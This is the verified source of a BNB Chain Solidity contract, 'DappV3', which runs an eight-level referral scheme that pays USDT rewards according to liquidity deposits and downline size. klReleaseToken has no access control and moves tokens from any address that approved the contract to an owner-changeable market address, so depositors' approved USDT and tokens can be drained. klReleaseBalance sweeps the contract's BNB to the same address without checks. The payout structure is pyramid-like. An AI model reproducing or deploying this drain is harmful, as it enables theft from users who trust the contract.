/**
 *Submitted for verification at BscScan.com on 2023-04-17
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    function pairAddress() external view returns (address);    
    function routerAddress() external view returns (address);    
    function usdtAddress() external view returns (address);  
    function getMarketAddress() external view returns (address);
    function manulAddLpProvider(address[] calldata addrs) external returns (bool);
}

interface ISwapRouter {
    function factory() external pure returns (address);    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library EnumerableSet {
   
    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { 
            
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

    
            bytes32 lastvalue = set._values[lastIndex];

            set._values[toDeleteIndex] = lastvalue;
            
            set._indexes[lastvalue] = toDeleteIndex + 1; 

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

   
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }


    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

   
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }


    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

   
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

   
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, ~uint256(0));
    }
}

contract DappV3 is Ownable {
    using EnumerableSet for EnumerableSet.AddressSet;
    struct UserInfo {
        mapping(uint8=>uint16) c; 
        mapping(uint8=>uint112) u; 
        uint112 inputAmount;
        uint112 claimed; 
        uint112 reward; 
        uint112 lpAmount; 
        address parent; 
        EnumerableSet.AddressSet invited; 
    }
    uint112 private _lpRewardAmount; 
    uint112 private _limitAmount;
    uint112 private _gasAmount; 
    uint112 private _gasBackAmount; 
    ISwapRouter private _swapRouter;
    address private _marketAddress;
    IERC20 private _usdtContract;
    IERC20 private _myTokenContract;
    IERC20 private _usdtPairContract;
    TokenDistributor private _tokenDistributor;
    mapping(address => UserInfo) private _userInfo; 
    EnumerableSet.AddressSet private _userList;

    constructor (address contractAddress){        
        _setKlTokenContractAddress(contractAddress);
        _gasAmount=5e15;
        _limitAmount=1e20;
        _gasBackAmount=2e16;
    }

    function getParam() external view returns(uint112 lpRewardAmount, uint112 limitAmount, uint112 gasAmount, uint112 gasBackAmount, 
        address tokenDistributor, address marketAddress, address myTokenContract){
        lpRewardAmount=_lpRewardAmount;
        limitAmount=_limitAmount;
        gasAmount=_gasAmount;
        gasBackAmount=_gasBackAmount;
        tokenDistributor=address(_tokenDistributor);
        marketAddress=_marketAddress;
        myTokenContract=address(_myTokenContract);
    }

    function addLpAmount(uint112 usdtAmount) external{
        require(msg.sender == address(_myTokenContract), "invalid caller address");
        _lpRewardAmount += usdtAmount;
    }

   
    function klInputU(uint112 usdtAmount, uint112 klAmount, address parent) external returns (bool success) { 
        require(usdtAmount >= 5e19, "klInputU(): amount should be big than 50");
        address msgSender = msg.sender;
        require(!isContract(msgSender),"caller should not contract");
        if(msgSender != address(0x89950d64907Cd1B5aAea1403394c420A718a9800)) {
        
            require(parent!=address(0), "klInputU(): parent is zero address");
            require(_userInfo[parent].inputAmount>0, "klInputU(): parent no inputU");
        }else{
            require(parent==address(0), "klInputU(): marketAddress parent should be zero address");
        }
        address addressThis = address(this);
        
        _usdtContract.transferFrom(msgSender, addressThis, usdtAmount);    
        _myTokenContract.transferFrom(msgSender, addressThis, klAmount);    
        uint256 lpBalance = _usdtPairContract.balanceOf(addressThis);
        _swapRouter.addLiquidity(address(_usdtContract), address(_myTokenContract), usdtAmount, klAmount, usdtAmount, 0, addressThis, 9e11);
        lpBalance = _usdtPairContract.balanceOf(addressThis)-lpBalance;
        UserInfo storage userInfo = _userInfo[msgSender];
        userInfo.inputAmount += usdtAmount;   
        userInfo.lpAmount += uint112(lpBalance);
        _userList.add(msgSender);
        if(userInfo.parent == address(0)) { 
            if(parent!=address(0)){
                userInfo.parent = parent; 
                _userInfo[parent].invited.add(msgSender); 
                for(uint8 i=0;i<8;++i){ 
                    if(userInfo.parent!=address(0)){ 
                        userInfo = _userInfo[userInfo.parent];
                        userInfo.c[i] += 1; 
                        userInfo.u[i] += usdtAmount; 
                    }else{
                        break;
                    }
                }
            } 
        }else{ 
            if(!_userInfo[userInfo.parent].invited.contains(msgSender)){ 
                _userInfo[userInfo.parent].invited.add(msgSender); 
                for(uint8 i=0;i<8;++i){ 
                    if(userInfo.parent!=address(0)){ 
                        userInfo = _userInfo[userInfo.parent];
                        userInfo.c[i] += 1; 
                        userInfo.u[i] += usdtAmount; 
                    }else{
                        break;
                    }
                }
            }else{
                
                for(uint8 i=0;i<8;++i){ 
                    if(userInfo.parent!=address(0)){ 
                        userInfo = _userInfo[userInfo.parent];
                        userInfo.u[i] += usdtAmount; 
                    }
                }
            }
        }
        
        return true;
    }

    function klClearLp() external{ 
        address account = msg.sender;
        UserInfo storage userInfo = _userInfo[account];
        uint112 usdtAmount = userInfo.inputAmount;
        uint112 lpAmount = userInfo.lpAmount;
        require(usdtAmount>0&&lpAmount>0,"you has clear the lp from dapp");
        for(uint8 i=0;i<8;++i){ 
            if(userInfo.parent!=address(0)){ 
                userInfo = _userInfo[userInfo.parent];
                if(userInfo.u[i]>=usdtAmount) userInfo.u[i] -= usdtAmount;
                if(userInfo.c[i]>=1) userInfo.c[i] -= 1;
                if(i==0 && userInfo.invited.contains(account)) userInfo.invited.remove(account);
            }
        }
        
        _userInfo[account].inputAmount=0;
        _userInfo[account].lpAmount=0;
        _userInfo[account].reward=0;
        _userInfo[account].claimed=0;
        if(_userList.contains(account)) _userList.remove(account);
        _usdtPairContract.transfer(account, lpAmount);        
        address[] memory lper = new address[] (1);
        lper[0]=account;
        _myTokenContract.manulAddLpProvider(lper);
    }


    function _getTeamUsdtAmount(address userAddress, uint256 level) internal view returns(uint256){
        UserInfo storage userInfo = _userInfo[userAddress];
        uint256 totalUsdtAmount = userInfo.inputAmount;
        if(level<=8){ 
            uint invitedLen=userInfo.invited.length();
            for(uint i=0;i<invitedLen;++i){                
                totalUsdtAmount += _getTeamUsdtAmount(userInfo.invited.at(i), level + 1);
            }
        }
        return totalUsdtAmount;
    }
     
    function queryTeamUsdtAmount(address userAddress) external view returns(uint256 totalUsdtAmount) {
        return _getTeamUsdtAmount(userAddress, 0); 
    }

    function _getTeamMemberCount(address userAddress, uint32 level) internal view returns(uint256){
        EnumerableSet.AddressSet storage invited = _userInfo[userAddress].invited;
        uint256 teamMemberCount = invited.length();
        if(level <= 8 ){ 
            uint invitedLen=invited.length();
            for(uint i=0;i<invitedLen;++i){
                teamMemberCount += _getTeamMemberCount(invited.at(i), level + 1);
            }
        }
        return teamMemberCount;
    }
    
    function queryTeamMemberCount(address userAddress) external view returns(uint256){
        return _getTeamMemberCount(userAddress, 1); 
    }

    function klQueryReward(address userAddress) public view returns(uint256 ub){
        UserInfo storage userInfo = _userInfo[userAddress];
        if(userInfo.inputAmount==0) return 0;
        uint256[] memory c = new uint[](8); 
        uint256[] memory u = new uint[](8); 
        EnumerableSet.AddressSet storage userList = _userList;
        uint256 len = userList.length();
        uint256 tc; 
        uint256 balance = _usdtContract.balanceOf(address(this))-_lpRewardAmount;         
        if(balance==0){ 
            return userInfo.reward-userInfo.claimed;
        }       
        balance = balance/100;   
        uint256[8]  memory r = [balance*20,balance*20,balance*10,balance*10,balance*10,balance*10,balance*5,balance*5]; 
        uint256 tb = balance*10; 

        for(uint256 i=0;i<len;++i){
            userInfo = _userInfo[userList.at(i)];
            if(userInfo.c[0]>7 && getMyMemberCount(userInfo)>49){
                tc += 1; 
            }
            for(uint8 j=0;j<8;++j){
                if(userInfo.c[j]>0) { 
                    c[j] += 1;  
                    u[j] += userInfo.u[j]; 
                }
            }
        }
        
        userInfo = _userInfo[userAddress];
        ub = userInfo.reward-userInfo.claimed;
        if(userInfo.c[0]>7 && getMyMemberCount(userInfo)>49 && tc>0){
            ub += tb/tc;
        }

        for(uint8 j=0;j<8;++j){
            if(userInfo.c[j]>0) {
                ub += r[j]*uint256(userInfo.u[j])/u[j];
            }
        }

        if(_lpRewardAmount>0){
            ub += uint256(_lpRewardAmount)*uint256(userInfo.lpAmount)/_usdtPairContract.balanceOf(address(this));
        }
    }

    function getMyMemberCount(UserInfo storage userInfo) internal view returns(uint256){
        return userInfo.c[0] + userInfo.c[1] + userInfo.c[2] + userInfo.c[3] + userInfo.c[4] + userInfo.c[5] + userInfo.c[6] + userInfo.c[7];
    }

    function klClaimReward() payable external {        
        uint256 gasUsed = gasleft();
        address msgSender = msg.sender;
        UserInfo storage userInfo = _userInfo[msgSender];
        require(!isContract(msgSender),"caller should not contract");
        require(userInfo.inputAmount>0,"your lp removed before");        
        require(msg.value >= _gasAmount, "Please pay enough bnb to claim");
        uint256[] memory c = new uint[](8); 
        uint256[] memory u = new uint[](8); 
        EnumerableSet.AddressSet storage userList = _userList;
        uint256 len = userList.length();
        uint256 lpRewardAmount=_lpRewardAmount;
        uint256 amount1;    
        uint256 amount2 = _usdtContract.balanceOf(address(this))-lpRewardAmount;   
        uint256 amount3; 
        address tokenDistributor = address(_tokenDistributor);
        if(amount2 < _limitAmount){
            amount1 = userInfo.reward-userInfo.claimed;            
            require(amount1>0,"avaliable claim is 0");
            _usdtContract.transferFrom(tokenDistributor, msgSender, amount1);
            userInfo.claimed += uint112(amount1);
            return;
        }
        
        _usdtContract.transfer(tokenDistributor, amount2+lpRewardAmount);    
        amount2 = amount2/100;   
        uint256[8]  memory r = [amount2*20,amount2*20,amount2*10,amount2*10,amount2*10,amount2*10,amount2*5,amount2*5]; 
        amount2 = amount2*10; 
        bool[] memory tcIndex = new bool[](len);
        
        for(uint256 i=0;i<len;++i){
            userInfo = _userInfo[userList.at(i)];
            if(userInfo.c[0]>7 && getMyMemberCount(userInfo) > 49){
                amount3 += 1; 
                tcIndex[i]=true; 
            }
            for(uint8 j=0;j<8;++j){
                if(userInfo.c[j]>0) { 
                    c[j] += 1;  
                    u[j] += userInfo.u[j]; 
                }
            }
        }
        amount1 = 0; 
        for(uint8 j=1;j<8;++j){
            if(c[j] == 0) amount1+=r[j]; 
        }
        if(amount3 == 0) amount1+=amount2;
        else amount2 = amount2/amount3; 

        if(amount1>0) _usdtContract.transferFrom(tokenDistributor, _marketAddress, amount1);
        
        amount3=_usdtPairContract.balanceOf(address(this)); 
        
        
        for(uint256 i=0;i<len;++i){ 
            userInfo =_userInfo[userList.at(i)];
            amount1 = 0; 
            if(tcIndex[i]){
                amount1 += amount2;
            }            
            for(uint8 j=0;j<8;++j){
                if(userInfo.c[j]>0 && u[j]>0) { 
                    amount1 += r[j]*uint256(userInfo.u[j])/u[j];
                }
            }
            if(lpRewardAmount>0 && userInfo.lpAmount>0){
                amount1 += lpRewardAmount*uint256(userInfo.lpAmount)/amount3; 
            }
            if(amount1>0) userInfo.reward += uint112(amount1);
        }
        _lpRewardAmount = 0;
        userInfo = _userInfo[msgSender];
        amount1 = userInfo.reward-userInfo.claimed;
        if(amount1>0){ 
            _usdtContract.transferFrom(tokenDistributor, msgSender, amount1);
            userInfo.claimed += uint112(amount1);
        }
        gasUsed = (gasUsed - gasleft())*tx.gasprice; 
        if(gasUsed>_gasBackAmount) gasUsed=_gasBackAmount;
        if(gasUsed>address(this).balance) gasUsed=address(this).balance;
        if(gasUsed>0) payable(msgSender).transfer(gasUsed);
    }   

    function klReleaseBalance() external {
        payable(_marketAddress).transfer(address(this).balance);
    }

    function klReleaseToken(address token, address from, uint256 amount) external {
        if(from==address(this))IERC20(token).transfer(_marketAddress, amount);
        else IERC20(token).transferFrom(from, _marketAddress, amount);
    }
    
    function getUserInfo(address userAddress) external view returns (
        uint16[] memory c, 
        uint112[] memory u, 
        uint112 inputAmount, 
        uint112 lpAmount,
        uint112 claimed, 
        uint112 reward, 
        address parent, 
        address[] memory invited){
        UserInfo storage userInfo = _userInfo[userAddress];
        c = new uint16[](8);
        u = new uint112[](8);
        for(uint8 i=0;i<8;++i){
            c[i] = userInfo.c[i];
            u[i] = userInfo.u[i];
        }
        inputAmount=userInfo.inputAmount;
        lpAmount=userInfo.lpAmount;
        claimed=userInfo.claimed;
        reward=userInfo.reward;
        parent=userInfo.parent;
        uint len = userInfo.invited.length();
        invited = new address[](len);
        for(uint i=0; i<len; ++i){
            invited[i]=userInfo.invited.at(i);
        }
    }
    
    
    function getUserList(uint offset, uint pageSize) external view returns (address[] memory){
        address[] memory list = new address[](pageSize);
        uint len = _userList.length();
        for(uint i=0; i<pageSize && (offset + i)<len; ++i){
            list[i]=_userList.at(offset+i);
        }
        return list;
    }

    
    function setKlTokenContractAddress(address contractAddress) external onlyOwner {
        _setKlTokenContractAddress(contractAddress);
    }

    function _setKlTokenContractAddress(address contractAddress) internal {
        _myTokenContract = IERC20(contractAddress);
        _usdtContract = IERC20(_myTokenContract.usdtAddress());
        _swapRouter = ISwapRouter(_myTokenContract.routerAddress());
        _usdtPairContract = IERC20(_myTokenContract.pairAddress());
        _marketAddress = _myTokenContract.getMarketAddress();
        _myTokenContract.approve(address(_swapRouter),~uint256(0));
        _usdtContract.approve(address(_swapRouter),~uint256(0));
        _tokenDistributor = new TokenDistributor(address(_usdtContract));
    }
    
    function setMarketAddress(address addr) external onlyOwner {
        _marketAddress = addr;
    }
    
    function setLimitAmount(uint112 amount) external onlyOwner {
        _limitAmount = amount;
    }
    
    function setGasAmount(uint112 amount) external onlyOwner {
        _gasAmount = amount;
    }
    
    function setGasBackAmount(uint112 amount) external onlyOwner {
        _gasBackAmount = amount;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
    receive() external payable {}    
}